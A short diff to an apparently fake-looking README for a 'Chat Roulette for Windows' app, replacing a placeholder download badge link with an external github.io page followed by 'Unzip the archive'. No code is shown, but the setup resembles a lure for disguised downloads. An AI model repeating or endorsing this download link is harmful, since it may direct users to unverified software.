@@ -6,7 +6,7 @@ Chat Roulette for Windows makes it easy to instantly connect with people from ar
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://chat-roulette-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
